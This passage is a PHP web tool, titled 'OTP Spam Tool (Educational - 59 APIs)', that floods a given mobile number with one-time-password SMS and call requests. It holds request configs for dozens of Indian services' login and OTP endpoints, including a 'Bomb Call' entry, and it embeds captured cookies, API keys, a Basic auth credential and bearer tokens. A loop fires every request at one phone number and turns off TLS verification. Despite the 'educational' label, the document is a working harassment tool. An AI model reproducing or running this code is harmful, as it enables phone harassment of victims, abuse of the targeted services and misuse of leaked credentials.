        'name' => 'UrbanClap Generate OTP V2',
        'method' => 'POST',
        'url' => 'https://www.urbanclap.com/api/v2/growth/profile/generateOTPv2',
        'headers' => [
            'Cookie: __cf_bm=DYmLmZXLDEmfiNOv6o86HgnUhBacayqiF.2VkoOFMgc-1720161468-1.0.1.1-x.dQYlrwENED0n0rVeQch91.UwzHGOA902JFqdYPF24T3cjCEP500OCMqZWa_9CmtKGYvKXkFJfOM12L44ICBg',
            'content-type: application/json',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Host: www.urbanclap.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"city_key":null,"countryId":"IND","customer":{"phone":{"isd_code":"+91","phone_wo_isd":"%s"}},"resend":false,"source":"phone"}'
    ],
    41 => [
        'name' => 'Jobhai Send OTP',
        'method' => 'POST',
        'url' => 'https://api.jobhai.com/auth/jobseeker/v3/send_otp',
        'headers' => [
            'Cookie: _abck=5EA54BD7CBF9C0F3B5F56C5C46D352C5~-1~YAAQRGw/F+M2NFGQAQAAYvzIkwxZN30HmrcwfUTeeFfhbupQ4Xo25XB8osVMGnYB9I70CjRAGAHeoGdEMi8PeihIlOYHhH2zpQXFQflAfBRp7miH6Qybduu3qqKl7/9pe5o/tkRDbxdOXMeNWvnSgdRm0HdQhs7gJE6zwoBclvwrTDsKPjg66WWFWjrFFvAitVOD2wqbsu2AiG5s0fJut8l5hwkPJOiGigMer0nO1tSBn2+jQsfEPSSEoCa9WhqkUSxgOoxCQCRFoHJVf1BLeZYWMd/wtSU0qO3IUE5L8YSrjhakZpOSyJV5Ql/Pt8ff0FJb0hO1i8lBmjpbJGGuwXSzzeIddBPgVGenlFhJrU4xA26ZB1zuDCY=~-1~-1~-1; ak_bmsc=F33D45EDC8381CD8D16DE513E22CAC48~000000000000000000000000000000~YAAQRGw/F+Q2NFGQAQAAYvzIkxg7dOsHXGci7hXTITtNfmjcngEkqlIacmeDS1U7WGc5mwjIoeSw1YGgzH1PyHJerHWkd6skKR+pGaHwS0rLEzOihP8kC8wsGcYOA/fkIJI7FSk/yEYewS5htpGdmqVweqmSeeqTSihkd8fReF4gjZ9BAyWltiqg0XO0bUWN4mfWlznSIASl2Z/RTKdMTayauhfXjc1utS4Z3Yd+E505kp3Uj6dAb9g5mp70/BEp2+NVeLC/qQsdsmpXgE84GrvONCWc55hrCseZLkS8OPTjseXYvFz9XoL2q7OTZyumR/e5jfo85Q3n9IdBNQOXo8U1F7IS/w+twcZelcu8zE3YD5IChsRUBXzbDWw=; bm_sv=18A7BB46BEDF3698B62720A95BD0AF51~YAAQRGw/F1VNNFGQAQAA7KPKkxhFiCZmR5DkWIrs5/pp88rnkJZwcY/+inulL7rj1JrLrE6wxgI7EEi46G71Rfc0shA6Xf2sTn5mZdSnMYBwmJMoHnpOtBi3XOMe6M4flBdpbwt5dix37awzrsciaGKNSCvYTcHpbQAsk7ga1aRXkl7OeYWDzN4mcFmSmteHCANZKLQOKrSltq6lrex8snAHlIjKLm3jCZh4E5EnGCjLJmi08zW42RqgN+lgdYht~1; bm_sz=5785E4E107BF9964E43CEE577A21F9E6~YAAQRGw/F+U2NFGQAQAAYvzIkxhAoLr1QbP8SxPwptqu6SRkSMxjpXIIiaIGMa5HmB8jyra6sJaHZaW4BBgHAlhNGgBIyVhUOfQa22x/fzONLynTRDewwpgmxR4a/qaXn5O8CEeWX966fv7szBUTfTqYuHek3wjjNQ2vi3Pq1Hq/AdI9mOB2ST5lWsJx5DNGw9G9KYZTH4LmhgBNnFtYrW/4nVY65CG4NSUQ9gKmzhXa4/fy3vquX718WiN4ymwybix3cInm+Izyl/4yEnFqCtjJshXBckq9zU42AFkLWWYGqBNwz4A1bWbUtHAtkTxrmMMvkH369JDFWt5YkmN0sumVirbpgVdmO3NRCz3U~3290673~4536373',
            'referer: https://www.jobhai.com/',
            'x-transaction-id: JS-WEB-cb71a96e-c335-4947-a379-bf6ee24f9a3d',
            'origin: https://www.jobhai.com',
            'language: en',
            'device-id: e97edd71-16a3-4835-8aab-c67cf5e21be1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'Content-Type: application/json',
            'Host: api.jobhai.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"phone":"%s"}'
    ],
 
    43 => [
        'name' => 'CityMall Web Get OTP',
        'method' => 'POST',
        'url' => 'https://citymall.live/api/cl-user/auth/get-otp',
        'headers' => [
            'x-app-name: WEB',
            'use-applinks: true',
            'Connection: keep-alive',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'x-requested-with: WEB',
            'Content-Type: application/json',
            'Host: citymall.live',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"phone_number":"%s"}'
    ],
    44 => [
        'name' => 'OneCard OTP Generate',
        'method' => 'POST',
        'url' => 'https://card.fplabs.tech:9000/onecard/bff/open/v1/web/otp/generate',
        'headers' => [
            'authorization: Basic ZnBsYWJzOjFGUExhYnMyMzIw',
            'content-type: application/json',
            'x-api-key: 78fec47f31afbace1588051dc4a594b86fa8bced48e48c3123ba8b29b6bf30f1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'Host: card.fplabs.tech:9000',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"mobile":"%s","deviceType":"WEB","whatsappConsent":true}'
    ],
    45 => [
        'name' => 'Zoop Customers Login',
        'method' => 'POST',
        'url' => 'https://webapi.zoopindia.com/v3/customers/login',
        'headers' => [
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'source: Desktop-Web',
            'deviceInfo: [object Object]',
            'Content-Type: application/json',
            'Host: webapi.zoopindia.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"mobile":"%s","source":"Desktop-Web"}'
    ],
    46 => [
        'name' => 'Spinny User OTP Request V3',
        'method' => 'POST',
        'url' => 'https://api.spinny.com/api/c/user/otp-request/v3/',
        'headers' => [
            'Content-Type: application/json',
            'User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)',
            'Host: api.spinny.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"contact_number":"%s","whatsapp":false,"code_len":4,"g-recaptcha-response":"03AFcWeA4vFfvSahNObwINE1dnN-C8rahsbSbuh4fqeqcBJ82qWMuwus56lEKOYaUxj8u0opIAA7co7oDhBaTuIHM-Do3wgKmbo68rCKnvtFpPHiKiEpmKQhPcjvAT_6_y-2iyj_DR80S5npM-jXnNMoFS92SJQYvjGBbWFD9lFiFEgbnAWMBxUwNVyacx1gVszD7HvqC_nLDISnnqi7iWBjoYDJgTUg5iqds1DA-KYxbtEDtcpKgBi6Em34U4GG1ggZoKijC-k8qy1lInhWqo-xK6EY6acXydcGHKgXzWrsdHG2aciibuozN-3ZAWNfN0GsFfU4L1os4pe4ruCW1rEAuDJ3HT5ojiD5iiUUg4OBcJkUHCu2LSTBrTacO8PHH4PT5ruV-rvZyNVvAuX5xDcJea1NBUYyMitVtK0Lf1M75e3k3XL6K1MTq3QDDPXJlrStTSrB6qZ-m3n9Tf6sCnDZ0jcRoMtHU414MzHym3Itswbj5YuJM8wcn5aAnvvBv7UGskct4Jz4ZyJdcC5cS8AzYNSmyAS3JawN644RVl59KaNGsuYt9Ls7o2UtWhkIwlIsIBukVZW35yTaGNUhEWaRrDD-3BfUwKtloJItM2En2_nuI3f71HfTVI-I0dY6kTrMRuYfCGaz67jZiekSSIuOxenxVxp1BcG6rEO-zx-fRM_gMyDuiKGTmq98l-lPIfhSUFRXtloNr_qcKp1m6_jpzrfIi8M6UhiCYcnQCmNv19MAA8BWnEiyPPI_-FGh12jp22OCGA0mcoqGNadE6w-IezHN8fi6aWBAPRgEYf42XPv5oWiVa0ykvHg0MZKChb7n3Avk_ADibr632go3SVIIfXrFUgbWsUDLocd1WBkpeaUyKlKSqisbjKqHpxFMMaJGcjapUDstT1EMFINhNUCgowcKTY5zGMm9W9R9N48Ouxgyin2c7_0LmS5wPj3onP9yOJ8E6GL3aMKhtcxn4lXfxymyB1VFMzMMD-sAfkVoMliWhsludZWTOhuSXUE75SYxfDjrOQTlu6oRrda8QbMpR7Hv2qK2NjnrlNx4Qq2wSR0w56-Qtlif5gfFrD0U_TI7OH-yVcj45v_p0jGdoJ2Zh_6oFip5fSnSgdzXhSoGAKEVbm6NGrIGYiWLj6o-fnZrzpfRvqaS9NedG3qjr0p94lVFSeiW0s0BK0KpDWlwY4C7nbeqLkjk55tabY9B_nZjN7IXmJKNv46tZqMJVZJW37z7xV9aBQ17VARz8_UgluqS97i-NwsLuwWMZpCNpJeYGRVIKFSJtN1l3LutO1USLkYU9Or9fPEPPSOpG0fDbaFnK2QVruku8XnhvEYGHHEM0mFGcJK1-Eds95wA1c3P0Hr6DLfW7k3JKjQx_hJm719-w-UwsOYqZccz1Sh00-dmGlSJsrgOljgPOD8ZVca4Xso92P-W3NxnNEZLO45IjzTIkB1ItKYEDG7V1b4ixqw36J_lkPt7ekLvFMhcvNZkyIWTpI42Ag7ALnn6P3SfWAZwkrGXry6LPikOJz1zB5FdzEtUuF9_EO-YjzBRr1pv9ZmbSbdT2MOJv3rQ40GREvbIIfd_BA_zSyPl7HSe8QMlBksjHapVfBE_jNtcakDVSWdE6CBZjPksgIUIv6yzC0LWZA1h6v4mX-K85hmIb01UnPtnTMD_7o4K79JzYgk4gFLBxjTZVyKvBhFpVhCcq7ePBWiO8LPDbaF6R7uSF8ZgrRunZbrEMrnLBqx6EKrdtJGgN2q8VFCDjNeQJH3CuYuOISzE_rPfc","expected_action":"login"}'
    ],
    47 => [
        'name' => 'OrangeHealth OTP Generate',
        'method' => 'POST',
        'url' => 'https://accounts.orangehealth.in/api/v1/user/otp/generate/',
        'headers' => [
            'Content-Type: application/json',
            'User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)',
            'Host: accounts.orangehealth.in',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"mobile_number":"%s","customer_auto_fetch_message":true}'
    ],
    48 => [
        'name' => 'Shyaway Send OTP',
        'method' => 'POST',
        'url' => 'https://www.shyaway.com/rest/default/V1/customer/sendOtp/',
        'headers' => [
            'Cookie: PHPSESSID=75cc94c0163c19616389d90ee8372b5f',
            'referer: https://www.shyaway.com/customer/account/login/',
            'origin: https://www.shyaway.com',
            'x-requested-with: XMLHttpRequest',
            'content-type: application/json',
            'priority: u=1, i',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'x-newrelic-id: VgMCUFBRDRAEVlBVBQEFU1E=',
            'Host: www.shyaway.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"username":"%s","type":"login","source":"html"}'
    ],
    49 => [
        'name' => 'Redcliffe Send OTP (Duplicate)',
        'method' => 'POST',
        'url' => 'https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false',
        'headers' => [
            'Cookie: gDeviceId=1dd5fbaf-338d-4094-b535-749f26749886',
            'Content-Type: application/json; charset=utf-8',
            'User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)',
            'Host: api.redcliffelabs.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"phone_number":"%s","short":true}'
    ],
    50 => [
        'name' => 'LunaLabs Stats Collect',
        'method' => 'POST',
        'url' => 'https://collector.lunalabs.io/api/v1/stats/collect',
        'headers' => [
            'Host: collector.lunalabs.io',
            'content-length: 487',
            'pragma: no-cache',
            'cache-control: no-cache',
            'user-agent: Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36',
            'content-type: text/plain;charset=UTF-8',
            'accept: */*',
            'x-requested-with: com.kalwar.antitoolz',
            'sec-fetch-site: cross-site',
            'sec-fetch-mode: no-cors',
            'sec-fetch-dest: empty',
            'accept-encoding: gzip, deflate',
            'accept-language: en-GB,en-US;q=0.9,en;q=0.8'
        ],
        'data_template' => '{"screenWidth":360,"screenHeight":592,"sessionId":"QJvahXGq0q/Wk8Ta","signature":"2cc14cc27170a848c0450f66d6e301b5b68d65e99152d7375486482c56a4ca8a","locale":"en","version":1,"appId":206278,"adNetwork":"unityads","buildId":9503494,"wasm":true,"permutationId":0,"lastPing":0,"interactionClientX":0,"interactionClientY":0,"isRewarded":2,"webglVersion":2,"os":"android","timestamp":8.600000001024455,"timedelta":8.600000001024455,"eventName":"system.load","timestampSinceFrame":-1,"seqNo":1}'
    ],
    51 => [
        'name' => 'Fleshia Bomb Call',
        'method' => 'POST',
        'url' => 'https://fleshia.com/antitoolz/bomb/call',
        'headers' => [
            'User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)',
            'Content-Type: application/json',
            'Host: fleshia.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"number":"%s","deviceid":"4362bd8ac31ee49f","token":"1rdcp2luRaxam5pCx+BlxQ=="}'
    ],
    52 => [
        'name' => 'My11Circle Get OTP V3',
        'method' => 'POST',
        'url' => 'https://www.my11circle.com/api/fl/auth/v3/getOtp',
        'headers' => [
            'Cookie: SSID=SSID648039f0-0740-47f7-83d0-39b0c52f2962; device.info.cookie={"bv":"125.0.0.0","bn":"Chrome","osv":"10","osn":"Windows","tbl":"false","vnd":"false","mdl":"false"}; sameSiteNoneSupported=true',
            'content-type: application/json',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Host: www.my11circle.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"mobile":"%s","deviceId":"22265356-a3cf-435a-ba9b-d77a9chyguh","deviceName":"","refCode":"","isPlaycircle":false}'
    ],
    53 => [
        'name' => 'Cosmofeed User Authenticate',
        'method' => 'POST',
        'url' => 'https://prod.api.cosmofeed.com/api/user/authenticate',
        'headers' => [
            'cosmofeed-request-id: fe247a51-c977-4882-a9b8-fe303692ddc3',
            'content-type: application/json',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'Host: prod.api.cosmofeed.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"phoneNumber":"%s","countryCode":"+91","data":{"email":"abcd2@gmail.com"},"authScreen":"signup-screen","userIsConvertingToCreator":false}'
    ],
    54 => [
        'name' => 'Adda52 Send OTP',
        'method' => 'POST',
        'url' => 'https://www.adda52.org.in/api/v1/offers/user/sendOtp',
        'headers' => [
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Host: www.adda52.org.in',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => 'user=%s&clientName=web&domainKey=Adda52.org.in&source=landing_page'
    ],
    
    56 => [
        'name' => 'StarHealth Get Call',
        'method' => 'POST',
        'url' => 'https://www.starhealth.in/api/seo/getcall/',
        'headers' => [
            'referer: https://www.starhealth.in/',
            'content-type: text/plain;charset=UTF-8',
            'origin: https://www.starhealth.in',
            'accept: */*',
            'User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)',
            'Host: www.starhealth.in',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"name":"name","mobile":"%s","income":"","pincode":"","url":"https:\/\/www.starhealth.in\/"}'
    ],
    57 => [
        'name' => 'Zoho Forms Book Demo',
        'method' => 'POST',
        'url' => 'https://forms.zohopublic.in/onsiteteams/form/FillthisformtobookdemoInternationalGoogle/formperma/tJ8rfOotVrl0FRjbgfTh4Te5rYtbz4ToQ9Nd8afSJbM/records',
        'headers' => [
            'Cookie: zalb_fb90f7f307=aac3771a758cfd755b2a8a0b2e4ba31e',
            'Origin: https://forms.zohopublic.in',
            'Accept: application/zoho.forms-v1+json',
            'X-Requested-With: XMLHttpRequest',
            'Connection: keep-alive',
            'Referer: https://forms.zohopublic.in/onsiteteams/form/FillthisformtobookdemoInternationalGoogle/formperma/tJ8rfOotVrl0FRjbgfTh4Te5rYtbz4ToQ9Nd8afSJbM?utm_source=homepage',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Site: same-origin',
            'Sec-Fetch-Mode: cors',
            'sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'Accept-Language: en-US,en;q=0.9',
            'Adv-Anal-Header: {"started_time":1728634806769,"dropoff_field":""}',
            'Content-Type: application/json',
            'Host: forms.zohopublic.in',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"SingleLine":"Antitoolz","PhoneNumber_country_code":"+91","PhoneNumber_country_iso_code":"in","PhoneNumber":"%s","Email":"abcs@gmail.com","SingleLine1":"Alfa Got","Dropdown2":"100-200","Dropdown":"Planning Manager","DateTime":"","Dropdown1":"","REFERRER_NAME":"https:\/\/onsiteteams.com\/","UTM_PARAM":{"utm_source":"homepage"}}'
    ],
    58 => [
        'name' => 'Tyreplex Send OTP',
        'method' => 'POST',
        'url' => 'https://www.tyreplex.com/includes/ajax/gfend.php',
        'headers' => [
            'Cookie: PHPSESSID=o8grmal00fdlit303nu2djpar1',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)',
            'Host: www.tyreplex.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => 'perform_action=sendOTP&action_type=order_login&mobile_no=%s&'
    ],
    
    // ... (all other APIs remain the same)
    59 => [
        'name' => 'Moglix Send OTP',
        'method' => 'POST',
        'url' => 'https://api-gt.moglix.com/api/auth/sendOTP',
        'headers' => [
            'Host: api-gt.moglix.com',
            'accept: application/json, text/plain, */*',
            'x-platform: APP',
            'buildversion: 5.4.35',
            'x-os: android',
            'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VJZCI6ImVjMDcwY2IxN2FhMDk2MWQiLCJidWlsZFZlcnNpb24iOiI1LjQuMzUiLCJ0b2tlblR5cGUiOiJHVUVTVF9UT0tFTiIsImlhdCI6MTc1NzA1MDc5NSwiZXhwIjoxNzcyNjAyNzk1fQ.LjKIz8Zabb8AyBlOtQjesqFMk_1MEfoX0SpHuoWkkt4',
            'content-type: application/json',
            'accept-encoding: gzip',
            'user-agent: okhttp/5.1.0'
        ],
        'data_template' => '{"type":"p","phone":"%s","email":"","source":"signup","device":"app"}'
    ]
];

// Function to send request to a single API
function sendToApi($api, $mobile) {
    $ch = curl_init();
    $method = $api['method'];
    $url = $api['url'];
    if (strpos($url, '%s') !== false) {
        $url = sprintf($url, $mobile);
    }
    $data = sprintf($api['data_template'], $mobile);

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $api['headers']);
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if (!empty($data)) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
    } elseif ($method === 'PUT') {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
        if (!empty($data)) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
    }
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return [
        'name' => $api['name'],
        'status' => $httpCode,
        'response' => $response ?: 'No response'
    ];
}

// Handle GET request
$mobile = $_GET['mobile'] ?? '';
$results = [];

if (!empty($mobile) && preg_match('/^\d{10}$/', $mobile)) {
    // Always send to all APIs (API ID selection removed)
    foreach ($apis as $api) {
        $results[] = sendToApi($api, $mobile);
    }
} elseif (!empty($mobile)) {
    $results[] = ['name' => 'Error', 'status' => 400, 'response' => 'Invalid mobile number (must be 10 digits)'];
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>OTP Sender Tool (Full)</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        form { margin-bottom: 20px; }
        input[type="text"] { padding: 10px; width: 200px; margin-right: 10px; }
        button { padding: 10px 20px; background: #007cba; color: white; border: none; cursor: pointer; }
        .result { margin: 10px 0; padding: 10px; border: 1px solid #ddd; background: #f9f9f9; }
        .error { background: #ffebee; color: #c62828; }
    </style>
</head>
<body>
    <h1>OTP Spam Tool (Educational - 59 APIs)</h1>
    <p>Enter a 10-digit mobile number and submit to send OTP requests to all APIs.</p>
    
    <form method="GET">
        <input type="text" name="mobile" placeholder="e.g., 9876543210" value="<?php echo htmlspecialchars($mobile); ?>" required>
        <button type="submit">Send OTPs to All APIs</button>
    </form>

    <?php if (!empty($results)): ?>
        <h2>Results:</h2>
        <?php foreach ($results as $result): ?>
            <div class="result <?php echo $result['status'] >= 400 ? 'error' : ''; ?>">
                <strong><?php echo htmlspecialchars($result['name']); ?>:</strong> Status <?php echo $result['status']; ?><br>
                <pre><?php echo htmlspecialchars(substr($result['response'], 0, 200)) . (strlen($result['response']) > 200 ? '...' : ''); ?></pre>
            </div>
        <?php endforeach; ?>
    <?php endif; ?>

    <h3>API List:</h3>
    <ul>
        <?php foreach ($apis as $id => $api): ?>
            <li><?php echo $id; ?>: <?php echo htmlspecialchars($api['name']); ?></li>
        <?php endforeach; ?>
    </ul>
</body>
</html>